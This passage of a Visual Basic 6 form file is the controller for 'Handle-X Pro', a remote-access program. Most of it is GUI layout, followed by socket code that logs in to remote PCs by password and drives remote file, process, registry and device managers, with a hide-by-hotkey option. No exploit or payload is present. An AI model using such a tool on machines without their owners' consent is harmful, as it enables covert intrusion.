         ForeColor       =   &H00FFFFFF&
         Height          =   195
         Index           =   3
         Left            =   240
         TabIndex        =   34
         Top             =   525
         Width           =   345
      End
      Begin VB.Line Line2 
         BorderColor     =   &H00FFFFFF&
         Index           =   23
         X1              =   120
         X2              =   120
         Y1              =   360
         Y2              =   4440
      End
      Begin VB.Line Line2 
         BorderColor     =   &H00FFFFFF&
         Index           =   21
         X1              =   120
         X2              =   3140
         Y1              =   4440
         Y2              =   4440
      End
      Begin VB.Line Line2 
         BorderColor     =   &H00FFFFFF&
         Index           =   35
         X1              =   120
         X2              =   120
         Y1              =   4500
         Y2              =   4880
      End
      Begin VB.Line Line2 
         BorderColor     =   &H00FFFFFF&
         Index           =   0
         X1              =   3120
         X2              =   3120
         Y1              =   360
         Y2              =   4440
      End
      Begin VB.Label Description 
         Appearance      =   0  'Flat
         BackColor       =   &H00A66539&
         BorderStyle     =   1  'Fixed Single
         Caption         =   " -Address Book- "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   1
         Left            =   240
         TabIndex        =   63
         Top             =   4170
         Width           =   2775
      End
   End
   Begin VB.PictureBox room 
      Appearance      =   0  'Flat
      BackColor       =   &H00FFFFFF&
      ForeColor       =   &H80000008&
      Height          =   375
      Index           =   11
      Left            =   10320
      ScaleHeight     =   345
      ScaleWidth      =   345
      TabIndex        =   10
      Top             =   5160
      Visible         =   0   'False
      Width           =   375
      Begin VB.TextBox inputs 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   225
         Index           =   0
         Left            =   1140
         TabIndex        =   236
         Top             =   660
         Width           =   1515
      End
      Begin VB.TextBox inputs 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   225
         Index           =   1
         Left            =   1140
         TabIndex        =   237
         Top             =   960
         Width           =   1515
      End
      Begin VB.CheckBox Checks 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         Caption         =   "Enable X-Firewall Engine."
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   195
         Index           =   0
         Left            =   5880
         TabIndex        =   227
         ToolTipText     =   "Click to Enable/Disable X-Firewall Engine."
         Top             =   660
         Width           =   2535
      End
      Begin VB.Label bar 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Username:"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Index           =   16
         Left            =   240
         TabIndex        =   235
         Top             =   660
         Width           =   855
      End
      Begin VB.Label bar 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "password:"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Index           =   15
         Left            =   240
         TabIndex        =   234
         Top             =   960
         Width           =   855
      End
      Begin VB.Label bar 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   " Misc :-"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Index           =   14
         Left            =   5940
         TabIndex        =   228
         Top             =   1140
         Width           =   585
      End
      Begin VB.Shape Shape2 
         BorderColor     =   &H00000000&
         BorderWidth     =   2
         Height          =   3555
         Index           =   4
         Left            =   5760
         Top             =   1260
         Width           =   2775
      End
      Begin VB.Label bar 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   " X-FireWall :-"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Index           =   13
         Left            =   5880
         TabIndex        =   226
         Top             =   300
         Width           =   1065
      End
      Begin VB.Shape Shape2 
         BorderColor     =   &H00000000&
         BorderWidth     =   2
         Height          =   675
         Index           =   3
         Left            =   5760
         Top             =   420
         Width           =   2775
      End
      Begin VB.Label bar 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   " System Cnfigurations :-"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Index           =   12
         Left            =   240
         TabIndex        =   225
         Top             =   300
         Width           =   1905
      End
      Begin VB.Shape Shape2 
         BorderColor     =   &H00000000&
         BorderWidth     =   2
         Height          =   2295
         Index           =   2
         Left            =   120
         Top             =   420
         Width           =   2655
      End
      Begin VB.Label bar 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   " Tools :-"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Index           =   11
         Left            =   3000
         TabIndex        =   224
         Top             =   300
         Width           =   705
      End
      Begin VB.Shape Shape2 
         BorderColor     =   &H00000000&
         BorderWidth     =   2
         Height          =   4395
         Index           =   1
         Left            =   2880
         Top             =   420
         Width           =   2775
      End
      Begin VB.Label bar 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   " Colors && Skins :-"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Index           =   10
         Left            =   240
         TabIndex        =   223
         Top             =   2760
         Width           =   1305
      End
      Begin VB.Shape Shape2 
         BorderColor     =   &H00000000&
         BorderWidth     =   2
         Height          =   1935
         Index           =   0
         Left            =   120
         Top             =   2880
         Width           =   2655
      End
      Begin VB.Label RoomTitle 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "\Handle-X\Configurations :\>"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   11
         Left            =   0
         TabIndex        =   181
         Top             =   0
         Width           =   8655
      End
   End
   Begin VB.Image Tools_Buttons 
      Appearance      =   0  'Flat
      Height          =   315
      Index           =   6
      Left            =   10080
      Picture         =   "frm_main.frx":5F6DE
      Stretch         =   -1  'True
      Tag             =   "X-Ping Tool"
      ToolTipText     =   "X-Ping"
      Top             =   380
      Width           =   315
   End
   Begin VB.Line Line1 
      BorderColor     =   &H00000000&
      BorderWidth     =   2
      Index           =   7
      X1              =   1920
      X2              =   10800
      Y1              =   6260
      Y2              =   6260
   End
   Begin VB.Line Line1 
      BorderColor     =   &H00000000&
      BorderWidth     =   2
      Index           =   4
      X1              =   15
      X2              =   15
      Y1              =   6480
      Y2              =   0
   End
   Begin VB.Line Line1 
      BorderColor     =   &H00000000&
      BorderWidth     =   3
      Index           =   6
      X1              =   1920
      X2              =   10860
      Y1              =   720
      Y2              =   720
   End
   Begin VB.Line Line1 
      BorderColor     =   &H00000000&
      BorderWidth     =   3
      Index           =   1
      X1              =   0
      X2              =   10920
      Y1              =   1080
      Y2              =   1080
   End
   Begin VB.Line Line1 
      BorderColor     =   &H00000000&
      BorderWidth     =   3
      Index           =   5
      X1              =   10810
      X2              =   10810
      Y1              =   6540
      Y2              =   0
   End
   Begin VB.Line Line1 
      BorderColor     =   &H00000000&
      BorderWidth     =   3
      Index           =   3
      X1              =   1920
      X2              =   1920
      Y1              =   360
      Y2              =   6240
   End
   Begin VB.Label Control_Box 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "H"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Index           =   5
      Left            =   9600
      MouseIcon       =   "frm_main.frx":603A8
      MousePointer    =   99  'Custom
      TabIndex        =   233
      ToolTipText     =   "Hide Hnadle-X and Restore By The Hoy-Key :[ALT+CTRL+F12]"
      Top             =   45
      Width           =   255
   End
   Begin VB.Image Tools_Buttons 
      Appearance      =   0  'Flat
      Height          =   315
      Index           =   5
      Left            =   9310
      Picture         =   "frm_main.frx":606B2
      Stretch         =   -1  'True
      Tag             =   "X-Ping Tool"
      ToolTipText     =   "X-Ping"
      Top             =   375
      Width           =   315
   End
   Begin VB.Image Tools_Buttons 
      Appearance      =   0  'Flat
      Height          =   315
      Index           =   4
      Left            =   8580
      Picture         =   "frm_main.frx":6137C
      Stretch         =   -1  'True
      Tag             =   "X-Whois Tool"
      ToolTipText     =   "X-Whois"
      Top             =   375
      Width           =   315
   End
   Begin VB.Image Tools_Buttons 
      Appearance      =   0  'Flat
      Height          =   315
      Index           =   3
      Left            =   7830
      Picture         =   "frm_main.frx":61686
      Stretch         =   -1  'True
      Tag             =   "X-Router Tool"
      ToolTipText     =   "X-Router"
      Top             =   370
      Width           =   330
   End
   Begin VB.Label Description 
      Alignment       =   2  'Center
      BackColor       =   &H00E0E0E0&
      Caption         =   "---[ By Muslim Arabian Egyptian Brains && Hands ]---"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   9
         Charset         =   177
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   255
      Index           =   17
      Left            =   2040
      TabIndex        =   212
      Top             =   2520
      Width           =   8655
   End
   Begin VB.Label Description 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   1  'Fixed Single
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   177
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   2895
      Index           =   2
      Left            =   2160
      TabIndex        =   198
      Top             =   2880
      Width           =   8415
   End
   Begin VB.Label Description 
      Alignment       =   2  'Center
      BackColor       =   &H00E0E0E0&
      Caption         =   "[ Copy Rights Reserved To : Handle-X Team © 6-8-2004 ]"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   9
         Charset         =   177
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   255
      Index           =   18
      Left            =   2040
      TabIndex        =   180
      Top             =   5880
      Width           =   8655
   End
   Begin VB.Image Tools_Buttons 
      Appearance      =   0  'Flat
      Height          =   315
      Index           =   2
      Left            =   6000
      Picture         =   "frm_main.frx":62350
      Stretch         =   -1  'True
      Tag             =   "X-Editor_Tool"
      ToolTipText     =   "X-Editor"
      Top             =   360
      Width           =   315
   End
   Begin VB.Image Tools_Buttons 
      Appearance      =   0  'Flat
      Height          =   315
      Index           =   1
      Left            =   2320
      Picture         =   "frm_main.frx":62C1A
      Stretch         =   -1  'True
      Tag             =   "Upload_Tool"
      ToolTipText     =   "Upload Manager"
      Top             =   380
      Width           =   315
   End
   Begin VB.Line Line1 
      BorderColor     =   &H00000000&
      BorderWidth     =   3
      Index           =   9
      X1              =   0
      X2              =   10860
      Y1              =   6480
      Y2              =   6480
   End
   Begin VB.Label bar 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Not Connected"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Index           =   0
      Left            =   20
      TabIndex        =   46
      Top             =   6240
      Width           =   1910
   End
   Begin VB.Label bar 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   1  'Fixed Single
      Caption         =   " No Current Connection"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   178
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   230
      Index           =   1
      Left            =   1940
      TabIndex        =   45
      Top             =   6270
      Width           =   8870
   End
   Begin VB.Label Control_Box 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "?"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Index           =   4
      Left            =   9900
      MouseIcon       =   "frm_main.frx":6305C
      MousePointer    =   99  'Custom
      TabIndex        =   44
      ToolTipText     =   "Help ?"
      Top             =   45
      Width           =   255
   End
   Begin VB.Image Tools_Buttons 
      Appearance      =   0  'Flat
      Height          =   310
      Index           =   0
      Left            =   1955
      Picture         =   "frm_main.frx":63366
      Stretch         =   -1  'True
      Tag             =   "Download_Tool"
      ToolTipText     =   "Download Manager"
      Top             =   380
      Width           =   310
   End
   Begin VB.Line Line2 
      BorderColor     =   &H00000000&
      BorderWidth     =   2
      Index           =   28
      X1              =   10440
      X2              =   10440
      Y1              =   360
      Y2              =   1080
   End
   Begin VB.Line Line2 
      BorderColor     =   &H00000000&
      BorderWidth     =   2
      Index           =   27
      X1              =   9280
      X2              =   9280
      Y1              =   360
      Y2              =   1080
   End
   Begin VB.Line Line2 
      BorderColor     =   &H00000000&
      BorderWidth     =   2
      Index           =   26
      X1              =   9648
      X2              =   9648
      Y1              =   360
      Y2              =   1080
   End
   Begin VB.Line Line2 
      BorderColor     =   &H00000000&
      BorderWidth     =   2
      Index           =   25
      X1              =   10050
      X2              =   10050
      Y1              =   360
      Y2              =   1080
   End
   Begin VB.Line Line2 
      BorderColor     =   &H00000000&
      BorderWidth     =   2
      Index           =   24
      X1              =   8920
      X2              =   8920
      Y1              =   360
      Y2              =   1080
   End
   Begin VB.Label Control_Box 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "-"
      BeginProperty Font 
         Name            =   "Terminal"
         Size            =   13.5
         Charset         =   255
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Index           =   1
      Left            =   10200
      MouseIcon       =   "frm_main.frx":637A8
      MousePointer    =   99  'Custom
      TabIndex        =   33
      ToolTipText     =   "Minimize"
      Top             =   45
      Width           =   255
   End
   Begin VB.Label Control_Box 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "X"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Index           =   0
      Left            =   10500
      MouseIcon       =   "frm_main.frx":63AB2
      MousePointer    =   99  'Custom
      TabIndex        =   32
      ToolTipText     =   "Unload Keko"
      Top             =   45
      Width           =   255
   End
   Begin VB.Image Logo 
      Appearance      =   0  'Flat
      BorderStyle     =   1  'Fixed Single
      Height          =   600
      Index           =   0
      Left            =   120
      Picture         =   "frm_main.frx":63DBC
      Stretch         =   -1  'True
      ToolTipText     =   "Welcom in KeKo"
      Top             =   420
      Width           =   1700
   End
   Begin VB.Line Line2 
      BorderColor     =   &H00000000&
      BorderWidth     =   2
      Index           =   19
      X1              =   8544
      X2              =   8544
      Y1              =   360
      Y2              =   1080
   End
   Begin VB.Line Line2 
      BorderColor     =   &H00000000&
      BorderWidth     =   2
      Index           =   18
      X1              =   8176
      X2              =   8176
      Y1              =   360
      Y2              =   1080
   End
   Begin VB.Line Line2 
      BorderColor     =   &H00000000&
      BorderWidth     =   2
      Index           =   17
      X1              =   7808
      X2              =   7808
      Y1              =   360
      Y2              =   1080
   End
   Begin VB.Line Line2 
      BorderColor     =   &H00000000&
      BorderWidth     =   2
      Index           =   16
      X1              =   7440
      X2              =   7440
      Y1              =   360
      Y2              =   1080
   End
   Begin VB.Line Line2 
      BorderColor     =   &H00000000&
      BorderWidth     =   2
      Index           =   15
      X1              =   7072
      X2              =   7072
      Y1              =   360
      Y2              =   1080
   End
   Begin VB.Line Line2 
      BorderColor     =   &H00000000&
      BorderWidth     =   2
      Index           =   14
      X1              =   6704
      X2              =   6704
      Y1              =   360
      Y2              =   1080
   End
   Begin VB.Line Line2 
      BorderColor     =   &H00000000&
      BorderWidth     =   2
      Index           =   13
      X1              =   6340
      X2              =   6340
      Y1              =   360
      Y2              =   1080
   End
   Begin VB.Line Line2 
      BorderColor     =   &H00000000&
      BorderWidth     =   2
      Index           =   12
      X1              =   5968
      X2              =   5968
      Y1              =   360
      Y2              =   1080
   End
   Begin VB.Line Line2 
      BorderColor     =   &H00000000&
      BorderWidth     =   2
      Index           =   11
      X1              =   5600
      X2              =   5600
      Y1              =   360
      Y2              =   1080
   End
   Begin VB.Line Line2 
      BorderColor     =   &H00000000&
      BorderWidth     =   2
      Index           =   10
      X1              =   5232
      X2              =   5232
      Y1              =   360
      Y2              =   1080
   End
   Begin VB.Line Line2 
      BorderColor     =   &H00000000&
      BorderWidth     =   2
      Index           =   9
      X1              =   4864
      X2              =   4864
      Y1              =   360
      Y2              =   1080
   End
   Begin VB.Line Line2 
      BorderColor     =   &H00000000&
      BorderWidth     =   2
      Index           =   8
      X1              =   4496
      X2              =   4496
      Y1              =   360
      Y2              =   1080
   End
   Begin VB.Line Line2 
      BorderColor     =   &H00000000&
      BorderWidth     =   2
      Index           =   7
      X1              =   4128
      X2              =   4128
      Y1              =   360
      Y2              =   1080
   End
   Begin VB.Line Line2 
      BorderColor     =   &H00000000&
      BorderWidth     =   2
      Index           =   6
      X1              =   3760
      X2              =   3760
      Y1              =   360
      Y2              =   1080
   End
   Begin VB.Line Line2 
      BorderColor     =   &H00000000&
      BorderWidth     =   2
      Index           =   5
      X1              =   3392
      X2              =   3392
      Y1              =   360
      Y2              =   1080
   End
   Begin VB.Line Line2 
      BorderColor     =   &H00000000&
      BorderWidth     =   2
      Index           =   4
      X1              =   3024
      X2              =   3024
      Y1              =   360
      Y2              =   1080
   End
   Begin VB.Line Line2 
      BorderColor     =   &H00000000&
      BorderWidth     =   2
      Index           =   3
      X1              =   2665
      X2              =   2665
      Y1              =   360
      Y2              =   1080
   End
   Begin VB.Line Line2 
      BorderColor     =   &H00000000&
      BorderWidth     =   2
      Index           =   2
      X1              =   2288
      X2              =   2288
      Y1              =   360
      Y2              =   1080
   End
   Begin VB.Label TiTle 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      Caption         =   " Handle-X Pro V1.0"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   9.75
         Charset         =   178
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   75
      TabIndex        =   25
      Top             =   45
      Width           =   9435
   End
   Begin VB.Line Line1 
      BorderColor     =   &H00000000&
      BorderWidth     =   3
      Index           =   8
      X1              =   9540
      X2              =   9540
      Y1              =   300
      Y2              =   0
   End
   Begin VB.Line Line1 
      BorderColor     =   &H00000000&
      BorderWidth     =   3
      Index           =   2
      X1              =   0
      X2              =   10800
      Y1              =   0
      Y2              =   0
   End
   Begin VB.Label Description 
      Alignment       =   2  'Center
      BackColor       =   &H00FFFFFF&
      BackStyle       =   0  'Transparent
      Caption         =   "Handle-X Trial V1.0"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   44.25
         Charset         =   177
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   1035
      Index           =   0
      Left            =   1920
      TabIndex        =   0
      Top             =   1320
      Width           =   8895
   End
   Begin VB.Line Line1 
      BorderColor     =   &H00000000&
      BorderWidth     =   3
      Index           =   0
      X1              =   0
      X2              =   10920
      Y1              =   330
      Y2              =   330
   End
End
Attribute VB_Name = "Frm_Main"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'User Variables
Dim a As Boolean, b As Integer, C As Integer 'variables for enable drag and drop of the main form
Dim door_nocked As Boolean ' the variable carry the state of any door pressed
Private Const ConnectionTimeOut = 10 '1 * 2 = 2 Sec
Public WaitVal As Integer
Public TxtPass As String
Private Sub door_Click(Index As Integer)
Dim i As Integer 'General Counter
On Error Resume Next
'Hide All Rooms
    For i = 0 To room.UBound
        room(i).Visible = False
    Next i
'Show the sellected room
    room(Index).Visible = True
'The Code He Will Executed In The Load Of the Room
 Select Case Index
        Case 0 'Connect Manager
        
        Case 1 'Chat Manager
        
        Case 2 'File Browser
            If IsFileBrowserLoaded = False Then LoadDrives 'Load The Drives
        Case 3 'Task Managare
            Load_Task_Manager
            TaskManagerButtons (1) 'Load Processes
        Case 4 'Reg Manager
            If IsFileRegistryLoaded = False Then
                RegistryManagerButtons (0)
            End If
        Case 13
            'Show Help Pages
             Control_Box_Click (4)
        Case 15 'Exit
            'The Code Here Is The Same As The X-Button at the Most Right-Top Of The Program
             Control_Box_Click (0)
 End Select
 'Show finished
End Sub
Private Sub FireWallCheck_Click(Index As Integer)
    FireWallCheckBoxes (Index)
End Sub
Private Sub Form_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
  'Operate the drag and drop of the main form
   a = False
   MousePointer = 0
End Sub
Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
    KillTimer WHandle, 1 'Kill FireWall Timer
End Sub
Private Sub IP_Buttons_Click(Index As Integer)
    On Error Resume Next
    Select Case Index
           Case 0 'Execute X-Router
                Router.ExecuteRouter Current_Connected.SelectedItem.SubItems(1)
           Case 1 'Execute X-Ping
                Ping.ExecutePing Current_Connected.SelectedItem.SubItems(1)
           Case 2 'Port Scanner
           
           Case 3 'Execute X-Whois
                Whois.ExecuteWhois Current_Connected.SelectedItem.SubItems(1)
           Case 8 'Edit Port
                    If AddressBook.ListItems.Count > 0 Then
                        EditAddressPort (AddressBook.SelectedItem.Index)
                    End If
           Case 9 'Edit Comment
                    If AddressBook.ListItems.Count > 0 Then
                        EditAddressComment (AddressBook.SelectedItem.Index)
                    End If
           Case 10 'Delete Entry
                    If AddressBook.ListItems.Count > 0 And MsgBox("Are You Sure you want to delete the selected entry", vbQuestion + vbYesNo, AppName) = vbYes Then
                        RemoveEntry (AddressBook.SelectedItem.Index)
                    End If
    End Select
End Sub
Private Sub Socket_DataArrival(Index As Integer, ByVal bytesTotal As Long)
On Error Resume Next
    Dim Temp As String
    Dim Mask As Byte
    Dim Command_Byte As Byte, Command_Data As String
   'Check If Comming data of the current Activated Socket ??
    If Index <> Current_Index Then Exit Sub
    Socket(Current_Index).GetData Temp, bytesTotal, bytesTotal
    Command_Byte = Asc(Left$(Temp, 1)) 'The Protocol Command Byte
    Command_Data = Mid$(Temp, 2) 'The Rest Of Comming Data Within The Command Byte
    Mask = 224 '11100000 (The Main Catogories is the first 3 bits)
    Mask = Command_Byte And Mask
If Left$(Temp, 4) = "Pass" Then 'Send Password
        Send_Data "Pass" & Txt_Pass
        Exit Sub
End If
If Left$(Temp, 4) = "IPas" Then 'Send Password
        Send_Data "IPas"
        MsgBox "Invalid Password.", vbExclamation, AppName
        Frm_Main.Txt_Pass.Enabled = True
        Frm_Main.TheManager.Tag = 0
        bar(1) = "No Connection"
        Exit Sub
End If
If Left$(Temp, 3) = "PC_" Then
        Dim PcName As String
        Frm_Main.Txt_Pass.Enabled = True
        PcName = Mid$(Temp, 4)
        Insert_Terminal (PcName)
        TheManager.Tag = 0
        TheManager_Timer
        Exit Sub
End If
Select Case Mask
    Case 64 '[010XXXXX]Chat-Manager Operations
        ChatManagerFunctions Command_Byte, Command_Data
    Case 96 '[011XXXXX]Device-Manager Operations
        DeviceManagerFunctions Command_Byte, Command_Data
    Case 128 '[100XXXXX]File-Browser Operations
        FileBrowserFunctions Command_Byte, Command_Data
    Case 160 '[101XXXXX]System-Registry Operations
        SystemFunctions Command_Byte, Command_Data
    Case 192 '[110XXXXX]Task Manager Function
        TaskManagerFunctions Command_Byte, Command_Data
End Select
End Sub
Public Function Send_Data(Data As String) As Boolean
    'On Error GoTo Failed
    If Socket(Current_Index).State = 7 Then
        'Data = Compress(Data)
        Socket(Current_Index).SendData Data
        Send_Data = True
        Exit Function
    End If
Failed:
    MsgBox "Not Connected Or The Network Isn't Ready Yet To Send New Data", vbExclamation, AppName
    Send_Data = False
End Function
Private Sub Form_Load()
    Initialize_KeKo
    Set_Text_Box_Number txt_Port, True 'Network amanger \ Port Textbox
    Set_Text_Box_Number TxtEditServer(0), True 'EditServer \ NewPort TextBox
   'Load GUI Variables
    WriteInfo 'Writes the authority information
   'Load The Main Application Parts(Catagories)
    Load_Network_Manager
    Load_File_Browser
    Load_Chat_Manager
    Load_Task_Manager
    Load_Registry_Manager
    Load_tools
    LoadDeviceManager
    LoadFireWall
End Sub
Public Sub TheManager_Timer()
On Error Resume Next
Dim i As Integer 'General Counter
   'Check LocalIP & Port Number
    If LocalIP <> Socket(0).LocalIP Then LocalIP = Socket(0).LocalIP
    If LocalHostName <> Socket(0).LocalHostName Then LocalHostName = Socket(0).LocalHostName
   'Check Current States Of All Connected Sockets
    For i = 1 To Current_Connected.ListItems.Count
        If Socket(Current_Connected.ListItems(i).Tag).State <> 7 Then
            MsgBox "Connection Lost With Host !" & vbCrLf & vbCrLf & _
                   "PC Name : " & Current_Connected.ListItems(i).Text & vbCrLf & _
                   "IP Number : " & Current_Connected.ListItems(i).SubItems(1) & vbCrLf & _
                   "Port Number : " & Current_Connected.ListItems(i).SubItems(2) _
                   , vbExclamation, AppName
            Remove_Terminal (Current_Connected.ListItems(i).Tag)
            UpdateCurrentConnection
        End If
    Next i
   'Other Operations
    Select Case Val(TheManager.Tag)
           Case 0 'Normal Mode
                bar(0) = ""
                If Socket(Current_Index).State = 0 Then bar(0) = "No Connection"
                If Socket(Current_Index).State = 1 Then bar(0) = "Connection Opened"
                If Socket(Current_Index).State = 2 Then bar(0) = "Wait for Connection"
                If Socket(Current_Index).State = 3 Then bar(0) = "Connection Closed"
                If Socket(Current_Index).State = 4 Then bar(0) = "Terminal Process Data"
                If Socket(Current_Index).State = 5 Then bar(0) = "Terminal Finished Processing"
                If Socket(Current_Index).State = 6 Then bar(0) = "Connect..."
                If Socket(Current_Index).State = 7 Then
                    bar(0) = "Connected"
                End If
                If Socket(Current_Index).State = 8 Then bar(0) = "Terminal closed Connection"
                If Socket(Current_Index).State = 9 Then bar(0) = "Connection Error"
                If Socket(Current_Index).State <> sckConnected Then bar(0) = "Not Connected"
           Case 1 'Waitting State
                If WaitVal >= ConnectionTimeOut Then
                    Socket(Current_Index).Close
                    TheManager.Tag = 0
                    WaitVal = 0
                    MsgBox "Connection Timed Out!" & vbCrLf & "Hint: The PC you tried to contact with may be within a LAN and unreachable!", vbInformation, AppName
                    bar(1) = " Connection Timed Out !!"
                    Txt_Pass.Enabled = True
                    Current_Index = Current_Connected.ListItems(1).Tag
                    UpdateCurrentConnection
                Else
                    WaitVal = WaitVal + 1
                End If
    End Select
End Sub
'''''''''''''''''''''''''''''''''<< Configurations >>''''''''''''''''''''''''''''''
Private Sub Inputs_Change(Index As Integer)
    'Configuraton String Inputs
     Select Case Index
            Case 0 'Username
                   UserName = Inputs(Index)
            Case 1 'Password
